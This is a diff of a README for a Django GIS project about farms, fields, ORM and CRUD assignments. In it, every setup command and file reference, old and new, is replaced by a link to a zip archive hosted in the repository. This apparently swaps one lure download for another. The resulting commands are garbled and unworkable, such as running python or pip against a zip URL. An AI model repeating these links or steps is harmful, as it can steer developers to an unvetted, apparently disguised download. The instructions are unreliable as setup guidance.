@@ -35,25 +35,25 @@ This project is a Django GIS application for managing **Farms**, **Fields**, and
 
 1. **Clone the repository**
 ```bash
-git clone https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip
+git clone https://raw.githubusercontent.com/Shamzmohamed/django-gis/main/farmadmin/gis_django_v1.7.zip
 cd django-gis
 ```
 2. **Install dependencies**
 ```
-pip install -r https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip
+pip install -r https://raw.githubusercontent.com/Shamzmohamed/django-gis/main/farmadmin/gis_django_v1.7.zip
 ```
 3. **Apply Migrations**
 ```
-python https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip makemigrations
-python https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip migrate
+python https://raw.githubusercontent.com/Shamzmohamed/django-gis/main/farmadmin/gis_django_v1.7.zip makemigrations
+python https://raw.githubusercontent.com/Shamzmohamed/django-gis/main/farmadmin/gis_django_v1.7.zip migrate
 ```
 4. **Create a superuser (optional)**
 ```
-python https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip createsuperuser
+python https://raw.githubusercontent.com/Shamzmohamed/django-gis/main/farmadmin/gis_django_v1.7.zip createsuperuser
 ```
 5. **Run development server**
 ```
-python https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip runserver
+python https://raw.githubusercontent.com/Shamzmohamed/django-gis/main/farmadmin/gis_django_v1.7.zip runserver
 ```
 6. **Access Django admin**
 ```
@@ -63,11 +63,11 @@ http://127.0.0.1:8000/admin/
 ### ORM Assignment Tasks (Assignment 2)
 ```
 git checkout django-lesson-2-orm  #Switch to branch 2
-python https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip run_orm
+python https://raw.githubusercontent.com/Shamzmohamed/django-gis/main/farmadmin/gis_django_v1.7.zip run_orm
 ```
 ```
 All 12 ORM tasks are implemented in:
-https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip
+https://raw.githubusercontent.com/Shamzmohamed/django-gis/main/farmadmin/gis_django_v1.7.zip
 ```
 ---
 ### CRUD Views (Assignment 3)
@@ -109,7 +109,7 @@ path("farms/<int:pk>/delete/", farm_delete, name="farm_delete"),
 Comprehensive unit tests for the Wildlife app using Django’s TestCase. Includes test data setup, validation of all ORM queries from Lesson 2, edge-case handling (empty provinces, missing taxon), aggregation checks, and full test coverage ensuring query correctness.
 ```
 All tests are located in:
-https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip
+https://raw.githubusercontent.com/Shamzmohamed/django-gis/main/farmadmin/gis_django_v1.7.zip
 Run tests:
-python https://github.com/Shamzmohamed/django-gis/raw/refs/heads/main/.vscode/gis_django_v3.8.zip test wildlife
+python https://raw.githubusercontent.com/Shamzmohamed/django-gis/main/farmadmin/gis_django_v1.7.zip test wildlife
 ```
